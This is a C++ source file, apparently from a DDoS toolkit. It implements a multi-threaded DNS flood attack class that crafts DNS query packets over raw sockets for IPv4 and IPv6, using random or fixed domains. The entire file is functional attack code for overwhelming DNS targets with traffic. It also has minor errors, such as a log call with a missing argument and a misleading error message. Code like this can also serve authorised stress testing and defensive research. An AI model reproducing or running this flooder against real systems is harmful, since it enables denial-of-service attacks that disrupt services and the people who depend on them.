
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/ip.h>
#include <fcntl.h>
#include <errno.h>
#include <arpa/inet.h>

#include "xtool.h"
#include "pktbuild.h"
#include "CDDoSParams.h"
#include "CAttack.h"
#include "CUdpAtk.h"
#include "CDnsAtk.h"


bool CDnsAtk::check_params()
{
    if (m_params.m_is_random_domain)
    {
        return true;
    }
    
    if (m_params.m_domain[0] == 0)
    {
        printf("no domain param when dnsflood\n");
        return false;
    }

    if (m_params.m_payload_len > DNS_PKT_MAX_LEN)
    {
        printf("domain param(%u) too long when dnsflood\n", m_params.m_payload_len);
        return false;
    }
    return true;
}


int32_t CDnsAtk::build_dns_payload(char *payload)
{
    struct dnshdr *dnsh = (struct dnshdr*)payload;

    char domain_name[MAX_DOMAIN_LEN] = {0};
    this->get_dns_domain(domain_name);
    uint32_t domain_len = util_strlen(domain_name);

    int payload_len = sizeof(struct dnshdr) + domain_len + 2 + sizeof(struct dns_question);
    if (payload_len > DNS_PKT_MAX_LEN)
    {
        RC_LOG_ERROR("domain param(%u) too long when dnsflood\n", domain_len);
        return -1;
    }

    char *qname, *curr_lbl;
    struct dns_question *dnst;
    uint32_t curr_word_len = 0;

    dnsh->id = htons(0x0203);
    dnsh->opts = htons(1 << 8); // Recursion desired
    dnsh->qdcount = htons(1);

    qname = (char *)(dnsh + 1);
    curr_lbl = qname;
    util_memcpy(qname+1, domain_name, domain_len + 1); // Null byte at end needed

    // Write in domain
    for (uint32_t ii = 0; ii < domain_len; ii++)
    {
        if (domain_name[ii] == '.')
        {
            *curr_lbl = curr_word_len;
            curr_word_len = 0;
            curr_lbl = qname + 1 + ii;
        }
        else
        {
            curr_word_len++;
        }
    }
    *curr_lbl = curr_word_len;

    dnst = (struct dns_question *)(qname + domain_len + 2);
    dnst->qtype = htons(PROTO_DNS_QTYPE_A);
    dnst->qclass = htons(PROTO_DNS_QCLASS_IP);

    /*modify actual payload len*/
    return (sizeof(struct dnshdr) + domain_len + 2 + sizeof(struct dns_question));
}

int32_t CDnsAtk::attack_one_pkt(int thrd_index)
{
	pdu_l3_desc_t layer3 = get_layer3_info();

    int pkt_len = 0;


    if(m_params.m_ip_type == IP_V4){
	    if (m_params.m_is_random_domain)// 原逻辑
	    {
	        char payload[DNS_PKT_MAX_LEN] = {0};

	        layer3.payload_len = build_dns_payload(payload);
	        if (((uint32_t)-1) == layer3.payload_len)
	        {
	            return RC_ERROR;
	        }

	        /*modify actual payload len*/
	        pkt_len = modify_udp(&layer3, m_pkt_buf[thrd_index], ATTACK_BUF_LEN, payload);
	    }
	    else // add by caihouxiang
	    {
	        RC_LOG_ERROR("domain param(%u) too long when dnsflood\n");
	        layer3.payload_len = m_params.m_payload_len;
	        pkt_len = modify_udp(&layer3, m_pkt_buf[thrd_index], ATTACK_BUF_LEN, NULL);
	    }

	    sendpkt( layer3.dstaddr,  layer3.dport,  pkt_len,  thrd_index);
	}else{
		 char payload[DNS_PKT_MAX_LEN] = {0};
		 if (m_params.m_is_random_domain)// 原逻辑
		 {

			 layer3.payload_len = build_dns_payload(payload);
			 
			 if (((uint32_t)-1) == layer3.payload_len)
			 {
				 return RC_ERROR;
			 }
		 
		 }else{
			util_memcpy(payload, m_params.m_payload_data, m_params.m_payload_len);
			
		 }

			 int c = 0;
			 

			 int dns = libnet_build_dnsv4(
				 LIBNET_UDP_DNSV4_H,			/* TCP or UDP */
				 0x7777,		/* id */
				 0x0100,		/* request */
				 1, 			/* num_q */
				 0, 			/* num_anws_rr */
				 0, 			/* num_auth_rr */
				 0, 			/* num_addi_rr */
				 (uint8_t*)payload,
				 layer3.payload_len,
				 m_libnet,
				 0
				 );
			 
			 if (dns == -1)
			 {
				 RC_LOG_ERROR("Can't build  DNS packet: %s\n", libnet_geterror(m_libnet));
				 return RC_ERROR;
			 }

			 libnet_build_udp(
				 layer3.sport,
				 layer3.dport,
				 LIBNET_UDP_H + LIBNET_UDP_DNSV4_H+ layer3.payload_len,
				 0,
				 NULL, 
				 0,
				 m_libnet,
				 0);
			 
			 libnet_build_ipv6(
				 0,
				 0,
				 LIBNET_UDP_H +LIBNET_UDP_DNSV4_H+  layer3.payload_len,
				 IPPROTO_UDP,
				 64, //hop limit
				 layer3.srcaddr6,
				 layer3.dstaddr6,
				 NULL,/*payload*/
				 0,/*paylen*/
				 m_libnet,
				 0);
			 
			 char srcname[255]={0};
			 libnet_addr2name6_r(layer3.srcaddr6,1,srcname,255);
			 char dstname[255]={0};
			 libnet_addr2name6_r(layer3.dstaddr6,1,dstname,255);
			 RC_LOG_INFO("%15s/%5d -> %15s/%5d\n", srcname,layer3.sport,dstname,layer3.dport);
			 
			 c = libnet_write(m_libnet);
			 if (c == -1)
			 {
				 RC_LOG_INFO( "libnet_write: %s\n", libnet_geterror(m_libnet));
			 }
			 libnet_clear_packet(m_libnet);

	}


    return RC_OK;
}


/*
如果m_is_random_domain==true 将不会从payload中获取数据而是产生随机域名
*/
int32_t CDnsAtk::start()
{
    uint32_t ii = 0;
    pdu_l3_desc_t layer3 = get_layer3_info();
	if(m_params.m_ip_type == IP_V6){
		char errbuf[LIBNET_ERRBUF_SIZE];
		m_libnet= libnet_init(LIBNET_RAW6, /* injection type */
							NULL, /* network interface */
							errbuf); /* error buffer */
		if (m_libnet == NULL)
		{				

			RC_LOG_ERROR("libnet_init() failed: %s", errbuf);				

		}	
		libnet_seed_prand(m_libnet);
		return RC_OK;
	}


    char payload[DNS_PKT_MAX_LEN] = {0};

	//只有在dns攻击指定了报文 且不是随机域名的情况下 使用传递的payload caihouxiang
	if(m_params.m_payload_data != NULL && m_params.m_is_random_domain == false){
	    for (ii = 0; ii < g_thrd_cnt; ii++)
	    {
	        m_fd[ii] = init_raw_udp_socket();
	        if (m_fd[ii] == -1)
	        {
	            return RC_ERROR;
	        }
	        
	        m_pkt_buf[ii] = (char*)malloc(ATTACK_BUF_LEN);
	        /*modify actual payload len*/
	        modify_udp(&layer3, m_pkt_buf[ii], ATTACK_BUF_LEN, m_params.m_payload_data );
	    }
	}
	else{
	    layer3.payload_len = build_dns_payload(payload);
	    if (((uint32_t)-1) == layer3.payload_len)
	    {
	        return RC_ERROR;
	    }

	    if (m_params.m_is_random_domain == false)
	    {
	        //payload 长度固定
	        m_params.m_payload_len = layer3.payload_len;
	    }

	    for (ii = 0; ii < g_thrd_cnt; ii++)
	    {
	        m_fd[ii] = init_raw_udp_socket();
	        if (m_fd[ii] == -1)
	        {
	            return RC_ERROR;
	        }
	        
	        m_pkt_buf[ii] = (char*)malloc(ATTACK_BUF_LEN);
	        /*modify actual payload len*/
	        modify_udp(&layer3, m_pkt_buf[ii], ATTACK_BUF_LEN, payload);
	    }
	}

    return RC_OK;
}
